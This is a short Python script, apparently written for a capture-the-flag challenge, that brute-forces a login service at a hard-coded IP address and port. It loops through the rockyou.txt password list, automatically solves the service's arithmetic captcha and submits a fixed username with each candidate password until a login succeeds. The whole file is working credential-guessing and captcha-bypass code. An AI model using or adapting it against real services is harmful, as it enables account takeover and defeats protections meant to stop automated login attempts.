import socket
import os
import re
import time

host = "157.230.179.99"
port = 1337
wordlist = "/usr/share/wordlists/rockyou.txt"
regex = r'^([0-9]+) ([\+\-\*\/]) ([0-9]+)'

def brute_force():
	username = "ejnorman84"
	password = ""

	with open(wordlist, "r") as ifile:
        	for line in ifile:
            		password = line

			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((host, port))

			# captcha stuff
			match = None
			ans = 0

			while match is None:
				time.sleep(1)
				header = s.recv(2048)
				headers = header.split('\n')

				for h in headers:
					print(h)
					match = re.search(regex, h)

					if match:
						break

			if match.group(0):
				if match.group(2) == '+':
					ans = int(match.group(1)) + int(match.group(3))
				elif match.group(2) == '-':
					ans = int(match.group(1)) - int(match.group(3))
				elif match.group(2) == '*':
					ans = int(match.group(1)) * int(match.group(3))
				elif match.group(2) == '/':
					ans = int(match.group(1)) / int(match.group(3))
				else:
					print("ERROR")

			print("ANSWER: " + str(ans))
			s.send(str(ans).encode() + '\n')

			# username + password stuff
			data = s.recv(1024)
			print(data)
			print("Sending username: " + username)
			s.send(username + "\n")

			data = s.recv(1024)
			print(data)
			print("Sending password: " + password)
			s.send(password + "\n")

			# get return message
			time.sleep(1)
			ret = s.recv(2048)
			print(ret)

			if "Fail" not in ret:
				print("SGB HERE")
				break

if __name__ == '__main__':
	brute_force()
